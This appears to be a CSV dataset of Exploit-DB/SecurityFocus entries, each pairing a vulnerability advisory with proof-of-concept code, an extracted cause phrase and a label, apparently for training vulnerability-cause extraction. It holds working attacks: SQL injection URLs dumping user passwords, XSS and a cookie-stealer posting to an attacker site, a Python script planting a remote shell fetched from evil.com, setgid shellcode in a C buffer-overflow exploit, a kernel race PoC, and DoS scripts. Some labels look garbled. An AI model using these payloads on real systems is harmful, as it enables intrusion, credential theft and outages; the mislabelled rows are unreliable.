sources,1
23206,"DCP-Portal 5.5 - 'lostpassword.php?email' SQL Injection source: https://www.securityfocus.com/bid/8739/info   Multiple SQL Injection vulnerabilities have been discovered that affect DCP-Portal scripts. These issues are likely due to a lack of sufficient sanitization performed on user supplied URI parameters. Attacks have been demonstrated that inject partial SQL queries, as values for URI parameters, in a manner that influences DCP-Portal SQL query logic to the attackers benefit.   An attacker may exploit these conditions to disclose DCP Portal credentials, reset user passwords, or perform a denial of service type attack via email spamming.  http://www.example.com/dcp/lostpassword.php?action=lost&email=fake' or 1=1--'",a lack of sufficient sanitization performed on user supplied URI parameters,1
35158,"Mongoose 2.11 - 'Content-Length' HTTP Header Remote Denial of Service source: https://www.securityfocus.com/bid/45602/info  Mongoose is prone to a remote denial-of-service vulnerability because it fails to handle specially crafted input.  Successfully exploiting this issue will allow an attacker to crash the affected application, denying further service to legitimate users.  Mongoose 2.11 is vulnerable; other versions may also be affected.   import socket   host = 'localhost' port = 8080   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.settimeout(8)    s.connect((host, port)) s.send('GET / HTTP/1.1\r\n'        'Host: ' + host + '\r\n'        'Content-Length: -2147483648\r\n\r\n')",fails to handle specially crafted input,1
27808,"Pacheckbook 1.1 - 'index.php' Multiple SQL Injections source: https://www.securityfocus.com/bid/17821/info  Pacheckbook is prone to multiple SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.   A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.  http://www.example.com/custdemos/cmuuugy61u0m/index.php?action=add&transtype=|SQL] http://www.example.com/custdemos/cmuuugy61u0m/index.php?action=edit&start=0&transtype=1&entry=|SQL|",a failure in the application to properly sanitize user-supplied input before using it in SQL queries,1
29002,DirectAdmin 1.28/1.29 - 'CMD_EMAIL_FORWARDER_MODIFY' Cross-Site Scripting source: https://www.securityfocus.com/bid/21049/info     DirectAdmin is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.      An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.     Versions 1.28.1 and 2.29 are vulnerable; other versions may also be affected.  http://www.example.com:2222/CMD_EMAIL_FORWARDER_MODIFY?DOMAIN=demo.com&user=XSS,fails to properly sanitize user-supplied input,1
33393,Joomla! Component You!Hostit! 1.0.1 Template - Cross-Site Scripting source: https://www.securityfocus.com/bid/37260/info  The Joomla! You!Hostit! template is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  You!Hostit! template 1.0.1 is vulnerable; other versions may also be affected.   http://www.example.com/path/?created_by_alias=%00'%22%3E%3CScRiPt%20%0a%0d%3Ealert(123456)%3B%3C/ScRiPt%3E&title=111-222-1933andresg888@gmail.com&text=111-222-1933andresg888@gmail.com&Submit=Submit,the application fails to properly sanitize user-supplied input,1
23085,"Sitebuilder 1.4 - 'sitebuilder.cgi' Directory Traversal source: https://www.securityfocus.com/bid/8521/info  Sitebuilder is said to be prone to a directory traversal vulnerability, potentially allowing users to disclose the contents of system files. The problem occurs due to the application failing to parse user-supplied input for directory traversal sequences (../) supplied to the 'sitebuilder.cgi' script, thus making it possible to access files outside of the established web root.   <html><body><p><center> <b>Mein 31337 Exploit :-P</b><br> <form action=""http://targethost.com/cgi-bin/sbcgi/sitebuilder.cgi"" method=POST> <input type=""hidden"" name=""username"" value=""targetuser""> <input type=""hidden"" name=""password"" value=""targetpassword""> <input type=""hidden"" name=""selectedpage"" value=""../../../../../../../../../../etc/passwd""> <p><input type=""submit"" name=""action"" value=""Yes - Use Advanced Editor""> <p><input type=""submit"" value=""Return to Site Builder""> </form> </center></body></html>",the,0
21209,"Ultimate Bulletin Board 5.4/6.0/6.2 - Cross-Agent Scripting source: https://www.securityfocus.com/bid/3829/info  UBB (Ultimate Bulletin Board) is commercial web forums/community software that is written in Perl. It runs on various Unix/Linux variants, as well as Microsoft Windows NT/2000.  UBB is prone to cross-agent scripting attacks via the insertion of HTML tags into image links in messages. Due to insufficient input validation, it is possible to insert arbitrary script code in forum messages/replies. The malicious script code will be executed in the browser of the user viewing the message, in the context of the site running UBB.  This makes it possible for a malicious user to post a message which is capable of stealing another legitimate user's cookie-based authentication credentials.   The following example will send cookie-based authentication credentials to the attacker's site:  [IMG]javascr&#x69;pt:document.wr&#x69;te &#x28;'<img%20src=&#x68;tt&#x70;://attackersite/tools/cookie.plx? cookie='+escape&#x28;document.cook&#x69;e&#x29;+'>'&#x29; [/IMG]","insufficient input validation,",1
26670,"SoftBiz B2B trading Marketplace Script 1.1 - 'buyoffers.php?cid' SQL Injection source: https://www.securityfocus.com/bid/15652/info   Softbiz B2B Trading Marketplace is prone to multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.   Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   Versions 1.1 and prior are reported to be vulnerable; other versions may also be affected.   http://www.example.com/buyoffers.php?cid=[SQL]",a failure in the application to properly sanitize user-supplied input before using it in an SQL query,1
9587,"Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service ***** MS IIS FTPD DoS ZER0DAY *****  There is a DoS vulnerability in the globbing functionality of IIS FTPD. Anonymous users can exploit this if they have read access to a directory!!! Normal users can exploit this too if they can read a directory.  Example session where the anonymous user has read access to the folder ""pub"":  C:\Users\Nikolaos>ftp 192.168.2.102 Verbindung mit 192.168.2.102 wurde hergestellt. 220 Microsoft FTP Service Benutzer (192.168.2.102:(none)): ftp 331 Anonymous access allowed, send identity (e-mail name) as password. Kennwort: 230 Anonymous user logged in. ftp> ls ""-R p*/../"" ... p*/../pub: pub ... p*/../pub: pub ... p*/../pub: pub ... p*/../pub: pub ... Verbindung beendet durch Remotehost. (MEANS: Remote Host has closed the connection) ftp> ftp>  By looking into my debugging session with OllyDbg I see that an exception is raised and the ftp service crashes due to a ""stack overflow"", what is a stack exhaustion. If the ftp service is set to ""manual"" startup in services control manager the service needs to be restarted manually. IIS 5.0 and 6.0 were tested and are affected.  Best Regards,  Nikolaos Rangos  # milw0rm.com [2009-09-04]","a ""stack overflow"", what is a stack exhaustion",0
33916,Mango Blog 1.4.1 - '/archives.cfm/search' Cross-Site Scripting source: https://www.securityfocus.com/bid/39864/info  Mango Blog is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Versions prior to Mango Blog 1.4.2 are vulnerable.   http://www.example.com/archives.cfm/search/?term=%3Cbody%20onload=alert(document.cookie)%3E,fails to properly sanitize user-supplied input,1
26673,"SoftBiz FAQ 1.1 - 'index.php?cid' SQL Injection source: https://www.securityfocus.com/bid/15653/info  Softbiz FAQ is prone to multiple SQL injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in an SQL query.  A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.  Softbiz FAQ 1.1 and prior versions are vulnerable; other versions may also be affected.   http://www.example.com/index.php?cid=[SQL]",the application fails to properly sanitize user-supplied input before using it in an SQL query,1
32250,"mUnky 0.01 - 'index.php' Remote Code Execution source: https://www.securityfocus.com/bid/30705/info  mUnky is prone to a remote code-execution vulnerability because the application fails to properly sanitize user-supplied input.  Exploiting this issue allows attackers to cause the application to execute arbitrary script code in the context of the application; other attacks are also possible.   mport httplib,urllib  site=raw_input('Site [Ex www.r3d.com]: ')  path=raw_input('Path [Ex /munky]: ')  shell=raw_input('Shell [Ex http://evil.com/shell.txt]: ')  print ""[*]Powered by : R3d.W0rm - r3d.w0rm (at) yahoo (dot) com [email concealed]""  conn=httplib.HTTPConnection(site)  print ""[*]Connected to "" + site  print ""[*]Sending shell code ...""  conn.request('GET',path + ""/?zone=<?php%20$fp=fopen('r3d.w0rm.php','w%2B');fwrite($fp,'<?php%20inc lude%20\\'"" + shell + ""\\';?>');fclose($fp);?>"")  print ""[*]Running shell code ...""  data=urllib.urlopen('http://' + site + path + '/?zone=../logs/counts.log%00')  print ""[*]Shell created""  print ""[*]"" + site + path + '/r3d.w0rm.php'",the application fails to properly sanitize user-supplied input,1
26915,"Blender BlenLoader 2.x - File Processing Integer Overflow source: https://www.securityfocus.com/bid/15981/info  Blender is susceptible to an integer-overflow vulnerability. This issue is due to the application's failure to properly sanitize user-supplied input before using it in a memory allocation and copy operation.  This issue allows attackers to execute arbitrary machine code in the context of the user running the affected application.   perl -e 'print ""BLENDER_v273""; print ""\xf0\xff\xff\xff""x10' > vuln.blend",failure to properly sanitize user-supplied input before using it in a memory allocation and copy operation,1
33266,"Joomla! Component CB Resume Builder - 'group_id' SQL Injection source: https://www.securityfocus.com/bid/36598/info  The CB Resume Builder ('com_cbresumebuilder') component for Joomla! is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  The following example URI is available:  http://www.example.com/index.php?option=com_cbresumebuilder&task=group_members&group_id=-666+union+all+select+1,concat_ws(0x3a,username,password),3,4,5,6,7,8,9,10,11,12,13,14,15+from+jos_users--",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
25436,eGroupWare 1.0 - '/tts/index.php?filter' SQL Injection source: https://www.securityfocus.com/bid/13212/info    eGroupWare is prone to multiple input validation vulnerabilities. A fixed version is available.    The issues arise due to a failure of the application to properly validate user-supplied input. These issues result in cross-site scripting and SQL injection attacks.   http://egroupware/tts/index.php?filter=u99[SQL] http://egroupware/tts/index.php?filter=c99[SQL],a failure of the application to properly validate user-supplied input,1
28098,PHP Blue Dragon CMS 2.9.1 - Multiple Remote File Inclusions source: https://www.securityfocus.com/bid/18609/info  PHP Blue Dragon CMS is prone to multiple remote file-include vulnerabilities because it fails to properly sanitize user-supplied input to the application.  An attacker may leverage these issues to have an arbitrary remote file containing malicious script code execute in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system. Other attacks are also possible.  http://www.example.com/root_includes/root_modules/forum_admin.php?action=forum_move&template_redirect=yes&vsDragonRootPath=http://192.168.0.xx:9999/,fails to properly sanitize user-supplied input to the application,1
28575,PhotoPost Pro 4.6 - Multiple Remote File Inclusions source: https://www.securityfocus.com/bid/20028/info  PhotoPost Pro is prone to multiple remote file-include vulnerabilities because the application fails to sufficiently sanitize user-supplied data.  Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  PhotoPost Pro 4.6 and prior versions are vulnerable; other versions may also be affected.  http://www.example.com/[path]/addfav.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-admlog.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-approve.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-backup.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-cats.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-cinc.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-db.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-editcfg.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-inc.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-index.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-modcom.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-move.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-options.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-order.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]//adm-pa.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-photo.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-purge.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-style.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-templ.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-userg.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-users.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/bulkupload.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/cookies.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/comments.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/ecard.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/editphoto.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/register.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/showgallery.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/showmembers.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/useralbums.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/uploadphoto.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/search.php?PP_PATH=[Attack Shell]? http://www.example.com/[path]/adm-menu.php?PP_PATH=[Attack Shell]?,the application fails to sufficiently sanitize user-supplied data,1
25865,"DUware DUamazon Pro 3.0/3.1 - 'detail.asp?iSub' SQL Injection source: https://www.securityfocus.com/bid/14033/info       DUamazon Pro is prone to multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.       Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.  http://www.example.com/DUamazonPro/shops/detail.asp?iPro=34&iSub=17[SQL Inject]",a failure in the application to properly sanitize user-supplied input before using it in SQL queries,1
34655,"Open Classifieds - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/43335/info  Open Classifieds is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary HTML and script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/buy.php/?page=1>'><ScRiPt %0A%0D>alert(317235523215)%3B</ScRiPt> http://www.example.com/contact.php?id=1<ScRiPt %0A%0D>alert(345135841734)%3B</ScRiPt> http://www.example.com/tellafriend.php?id=1>""><ScRiPt %0A%0D>alert(366396570535)%3B</ScRiPt>",fails to properly sanitize user-supplied input,1
22984,"Xtokkaetama 1.0 b-6 - Nickname Local Buffer Overflow (1) // source: https://www.securityfocus.com/bid/8337/info  xtokkaetama is prone to a locally exploitable buffer overflow vulnerability. This is due to insufficient bounds checking of the '-nickname' command line option, which could result in execution of arbitrary code in the context of the software.   The software is typically installed setgid 'games'.  /* (linux/x86)xtokkaetama[v1.0b+]: (games) local buffer overflow exploit.    by: v9[v9@fakehalo.deadpig.org]. (fakehalo)     exploits an overflow missed in the patch/upgrade of:     https://www.securityfocus.com/bid/8312     fix:     xtama_score.c:132: +strncpy(name,nickname,sizeof(name)-1);     xtama_score.c:132: -sscanf( nickname , ""%s"",name ) ;     (tested on non-debian, should still work elsewhere) */ #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #include <grp.h> #include <sys/types.h> #define PATH ""/usr/games/xtokkaetama"" /* game binary. */ static char exec[]= /* setgid(?)+shell.               */  ""\x31\xdb\x31\xc9\xb3\x00\xb1\x00\x31\xc0\xb0\x47\xcd""  ""\x80\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56""  ""\x07\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34""  ""\x12\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80""  ""\xe8\xd7\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x01""; int main(){  unsigned int i;  char *buf;  struct group *gent;  printf(""(*)xtokkaetama[v1.0b+]: local buffer overflow exploit.\n"");  printf(""(*)by: v9@fakehalo.deadpig.org / fakehalo.\n\n"");  if(!(buf=(char *)malloc(16384+1)))exit(1);  memset(buf,0x90,(16384-strlen(exec)));  if(!(gent=getgrnam(""games"")))exec[5]=exec[7]=20;  else{exec[5]=exec[7]=gent->gr_gid;}  strcat(buf,exec);  setenv(""EXEC"",buf,1);  memset(buf,0x0,(16384+1));  for(i=0;i<512;i+=4){*(long *)&buf[i]=0xbfffe001;}   printf(""[*] in the game, hit: spacebar, \""Q\"", spacebar, spacebar.\n"");  sleep(3);  printf(""[*] entering xtokkaetama...\n"");  if(execlp(PATH,PATH,""-nickname"",buf,0))   printf(""[!] failed to execute %s.\n"",PATH);  exit(0); }",insufficient bounds checking of the '-nickname' command line option,1
26762,"Mozilla Firefox 0.x/1.x - Large History File Buffer Overflow source: https://www.securityfocus.com/bid/15773/info  Mozilla Firefox is reportedly prone to a remote denial-of-service vulnerability.  This issue presents itself when the browser handles a large entry in the 'history.dat' file. An attacker may trigger this issue by enticing a user to visit a malicious website and by supplying excessive data to be stored in the affected file.  This may cause a denial-of-service condition.  **UPDATE: Proof-of-concept exploit code has been published. The author of the code attributes the crash to a buffer-overflow condition. Symantec has not reproduced the alleged flaw.   <!-- Firefox 1.5 buffer overflow  Basically firefox logs all kinda of URL data in it's history.dat file, this little script will set a really large topic and Firefox will then save that topic into it's history.dat.. The next time that firefox is opened, it will instantly crash due to a buffer overflow -- this will happen everytime until you manually delete the history.dat file -- which most users won't figure out.  this proof of concept will only prevent someone from reopening their browser after being exploited. DoS if you will. however, code execution is possible with some modifcations.  Tested with Firefox 1.5 on Windows XP SP2.  ZIPLOCK <sickbeatz@gmail.com>  --> <html><head><title>heh</title><script type=""text/javascript""> function ex() { 	var buffer = """"; 	for (var i = 0; i < 5000; i++) { 		buffer += ""A""; 	} 	var buffer2 = buffer; 	for (i = 0; i < 500; i++) { 		buffer2 += buffer; 	} 	document.title = buffer2; } </script></head><body>ZIPLOCK says <a href=""javascript:ex();"">CLICK ME </a></body></html>",a buffer overflow,0
25239,"CoolForum 0.5/0.7/0.8 - 'avatar.php?img' Cross-Site Scripting source: https://www.securityfocus.com/bid/12852/info  Multiple remote input validation vulnerabilities affect CoolForum. These issues are due to a failure of the application to properly sanitize user-supplied input prior to using it to carry out critical functionality.  Multiple SQL injection vulnerabilities have been reported and a cross-site scripting vulnerability is also reported.  An attacker may leverage these issues to manipulate and view arbitrary database contents by exploiting the SQL injection issues, and to have arbitrary script code executed in the browser of an unsuspecting user by exploiting the cross-site scripting vulnerabilities.   avatar.php?img=<script>alert(document.cookie)</script>",a failure of the application to properly sanitize user-supplied input prior to using it to carry out critical functionality,1
28930,"AIOCP 1.3.x - 'cp_show_ec_products.php' SQL Injection source: https://www.securityfocus.com/bid/20931/info             All In One Control Panel (AIOCP) is prone to multiple input-validation vulnerabilities because it fails to sufficiently sanitize user-supplied input data.             Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, access or modify sensitive data, execute arbitrary script code in the context of the application, compromise the application and possibly exploit latent vulnerabilities in the underlying system; other attacks are also possible.             AIOCP 1.3.007 and prior versions are vulnerable.  http://www.example.com/public/code/cp_show_ec_products.php?product_category_id=[sql] http://www.example.com/public/code/cp_show_ec_products.php?product_category_id=[sql] http://www.example.com/public/code/cp_show_ec_products.php?order_field=[sql]",fails to sufficiently sanitize user-supplied input data,1
37805,"TAGWORX.CMS - 'cid' SQL Injection source: https://www.securityfocus.com/bid/55586/info  TAGWORX.CMS is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/gallery.php?cid=124'&pid=124  http://www.example.com/gallery.php?cat_id=17&cid='&pid=&img=1  http://www.example.com/gallery.php?cid=124'&pid=124",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
25660,PHPHeaven PHPMyChat 0.14.5 - 'Style.CSS.php3' Cross-Site Scripting source: https://www.securityfocus.com/bid/13628/info  phpMyChat is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/chat/config/style.css.php3?Charset=iso-8859-1&medium=10&FontName=&lt;script&gt;var%20test=1;alert(test);&lt;/script&gt;,fails to properly sanitize user-supplied input,1
26335,"Aenovo - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/15038/info  aeNovo is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. These may facilitate the theft of cookie-based authentication credentials as well as other attacks.    http://www.example.com/target/search.asp?strSQL=SELECT+%2A+FROM+pages+where+1=2+union +all+select+'01','02','%3CScRiPT%20src=http://h4cK3r/devil_Script/%3E' ,null,null,null,null,null,null+from+control",a failure in the application to properly sanitize user-supplied input,1
26533,Revize CMS - 'Revize.XML' Information Disclosure source: https://www.securityfocus.com/bid/15482/info  Revize CMS is prone to an information disclosure vulnerability. This issue is due to a failure in the application to restrict access to sensitive files.  An attacker can exploit this vulnerability to retrieve sensitive information. Information obtained may aid in further attacks against the underlying system; other attacks are also possible.   A sample URI has been provided:  http://www.example.com/revize/conf/revise.xml,a failure in the application to restrict access to sensitive files,1
30581,CS-Guestbook 0.1 - Login Credentials Information Disclosure source: https://www.securityfocus.com/bid/25652/info  CS-Guestbook is prone to an information-disclosure vulnerability because the application fails to properly protect sensitive information.  An attacker can exploit this issue to access sensitive information that may lead to further attacks.   http://www.example.com/guest/base/usr/0.php,the application fails to properly protect sensitive information,1
38606,"WordPress Plugin WP Private Messages - 'msgid' SQL Injection source: https://www.securityfocus.com/bid/60854/info  WP Private Messages plugin for WordPress is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/wp-admin/profile.php?page=wp-private-messages/wpu_private_messages.php&wpu=reply&msgid=[Sql]",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
34769,"MySITE - SQL Injection / Cross-Site Scripting source: https://www.securityfocus.com/bid/43510/info  MySITE is prone to an SQL-injection vulnerability and a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/print.php?id=1&pid=-1%20or%201=1  http://www.example.com/portal/modules.php?name=Web_Links&l_op=search&query=%3Cscript%20src=http://websecurity.com.ua/webtools/xss.js%20",fails to sufficiently sanitize user-supplied data,1
46744,"Linux - Missing Locking in Siemens R3964 Line Discipline Race Condition /* The Siemens R3964 line discipline code in drivers/tty/n_r3964.c has a few races around its ioctl handler; for example, the handler for R3964_ENABLE_SIGNALS just allocates and deletes elements in a linked list with zero locking. This code is reachable by an unprivileged user if the line discipline is enabled in the kernel config; Ubuntu 18.04, for example, ships this line discipline as a module.  Proof of concept:  ================================== user@ubuntu-18-04-vm:~/r3964$ cat r3964_racer.c */  #define _GNU_SOURCE #include <pthread.h> #include <fcntl.h> #include <sys/ioctl.h> #include <stdio.h> #include <err.h> #include <stdlib.h> #include <linux/n_r3964.h>  static int ptm_fd, slave_fd;  static void *thread_fn(void *dummy) {   int res;   while (1) {     res = ioctl(slave_fd, R3964_ENABLE_SIGNALS, R3964_SIG_ALL);     printf(""R3964_ENABLE_SIGNALS: %d\n"", res);     res = ioctl(slave_fd, R3964_ENABLE_SIGNALS, 0);     printf(""R3964_ENABLE_SIGNALS: %d\n"", res);   } }  int main(void) {   ptm_fd = getpt();   if (ptm_fd == -1) err(1, ""getpt"");   if (unlockpt(ptm_fd)) err(1, ""unlockpt"");   slave_fd = ioctl(ptm_fd, TIOCGPTPEER, O_RDWR);   if (slave_fd == -1) err(1, ""TIOCGPTPEER"");    printf(""-----------------------------------------\n"");   system(""ls -l /proc/$PPID/fd"");   printf(""-----------------------------------------\n"");    const int disc_r3964 = N_R3964;   if (ioctl(slave_fd, TIOCSETD, &disc_r3964)) err(1, ""TIOCSETD"");    pthread_t thread;   if (pthread_create(&thread, NULL, thread_fn, NULL)) errx(1, ""pthread_create"");    thread_fn(NULL);    return 0; }  /* user@ubuntu-18-04-vm:~/r3964$ gcc -o r3964_racer r3964_racer.c -pthread && ./r3964_racer [...] ==================================  dmesg splat:  ================================== [   82.646953] r3964: Philips r3964 Driver $Revision: 1.10 $ [   82.656459] ------------[ cut here ]------------ [   82.656461] kernel BUG at /build/linux-Y38gIP/linux-4.15.0/mm/slub.c:296! [   82.658396] invalid opcode: 0000 [#1] SMP PTI [   82.659515] Modules linked in: n_r3964 joydev ipt_MASQUERADE nf_nat_masquerade_ipv4 nf_conntrack_netlink nfnetlink xfrm_user xfrm_algo iptable_nat nf_conntrack_ipv4 nf_defrag_ipv4 nf_nat_ipv4 xt_addrtype iptable_filter xt_conntrack nf_nat nf_conntrack libcrc32c br_netfilter bridge stp llc aufs overlay snd_hda_codec_generic crct10dif_pclmul crc32_pclmul snd_hda_intel snd_hda_codec snd_hda_core snd_hwdep ghash_clmulni_intel snd_pcm snd_seq_midi snd_seq_midi_event pcbc aesni_intel aes_x86_64 snd_rawmidi snd_seq snd_seq_device snd_timer snd crypto_simd glue_helper cryptd input_leds soundcore mac_hid 9pnet_virtio 9pnet serio_raw qemu_fw_cfg sch_fq_codel parport_pc ppdev lp parport ip_tables x_tables autofs4 virtio_gpu ttm floppy drm_kms_helper psmouse syscopyarea sysfillrect sysimgblt fb_sys_fops drm [   82.677770]  virtio_net i2c_piix4 pata_acpi [   82.678849] CPU: 1 PID: 2209 Comm: r3964_racer Not tainted 4.15.0-42-generic #45-Ubuntu [   82.680897] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1 04/01/2014 [   82.683098] RIP: 0010:kfree+0x16a/0x180 [   82.684116] RSP: 0018:ffffb6b381d7fd50 EFLAGS: 00010246 [   82.685454] RAX: ffff9bb0b4770000 RBX: ffff9bb0b4770000 RCX: ffff9bb0b4770000 [   82.687285] RDX: 0000000000006e86 RSI: ffff9bb1bfca70a0 RDI: ffff9bb1bb003800 [   82.689247] RBP: ffffb6b381d7fd68 R08: ffffffffc0511db0 R09: ffffffffc051202c [   82.691077] R10: ffffeb8c80d1dc00 R11: 0000000000000000 R12: ffff9bb1b3430e40 [   82.692906] R13: ffffffffc051202c R14: ffff9bb13b56e800 R15: ffff9bb12d1addd0 [   82.694726] FS:  00007ff9b92da740(0000) GS:ffff9bb1bfc80000(0000) knlGS:0000000000000000 [   82.696801] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 [   82.698421] CR2: 0000558cf9e32ec8 CR3: 00000000a513a005 CR4: 00000000003606e0 [   82.700259] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 [   82.702113] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400 [   82.703946] Call Trace: [   82.704602]  r3964_ioctl+0x27c/0x2b0 [n_r3964] [   82.705746]  tty_ioctl+0x138/0x8c0 [   82.706631]  ? __wake_up+0x13/0x20 [   82.707516]  do_vfs_ioctl+0xa8/0x630 [   82.708610]  ? vfs_write+0x166/0x1a0 [   82.709543]  SyS_ioctl+0x79/0x90 [   82.710405]  do_syscall_64+0x73/0x130 [   82.711357]  entry_SYSCALL_64_after_hwframe+0x3d/0xa2 [   82.712659] RIP: 0033:0x7ff9b8bd45d7 [   82.713680] RSP: 002b:00007fffcd85bcf8 EFLAGS: 00000202 ORIG_RAX: 0000000000000010 [   82.715617] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007ff9b8bd45d7 [   82.717463] RDX: 0000000000000000 RSI: 0000000000005301 RDI: 0000000000000004 [   82.719411] RBP: 00007fffcd85bd20 R08: 0000000000000000 R09: 0000000000000000 [   82.721248] R10: 0000000000000000 R11: 0000000000000202 R12: 0000556df58ed820 [   82.723093] R13: 00007fffcd85be30 R14: 0000000000000000 R15: 0000000000000000 [   82.724930] Code: c4 80 74 04 41 8b 72 6c 4c 89 d7 e8 61 1c f9 ff eb 86 41 b8 01 00 00 00 48 89 d9 48 89 da 4c 89 d6 e8 8b f6 ff ff e9 6d ff ff ff <0f> 0b 48 8b 3d 6d c5 1c 01 e9 c9 fe ff ff 0f 1f 84 00 00 00 00  [   82.729909] RIP: kfree+0x16a/0x180 RSP: ffffb6b381d7fd50 [   82.731310] ---[ end trace c1cd537c5d2e0b84 ]--- ==================================   I've also tried this on 5.0-rc2 with KASAN on, which resulted in this splat:  ================================== [   69.883056] ================================================================== [   69.885163] BUG: KASAN: use-after-free in r3964_ioctl+0x288/0x3c0 [   69.886855] Read of size 8 at addr ffff8881e0474020 by task r3964_racer/1134 [   69.888820]  [   69.889251] CPU: 3 PID: 1134 Comm: r3964_racer Not tainted 5.0.0-rc2 #238 [   69.891729] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1 04/01/2014 [   69.894535] Call Trace: [   69.895223]  dump_stack+0x71/0xab [   69.896134]  ? r3964_ioctl+0x288/0x3c0 [   69.897181]  print_address_description+0x6a/0x270 [   69.898473]  ? r3964_ioctl+0x288/0x3c0 [   69.899499]  ? r3964_ioctl+0x288/0x3c0 [   69.900534]  kasan_report+0x14e/0x192 [   69.901562]  ? r3964_ioctl+0x288/0x3c0 [   69.902606]  r3964_ioctl+0x288/0x3c0 [   69.903586]  tty_ioctl+0x227/0xbd0 [...] [   69.917312]  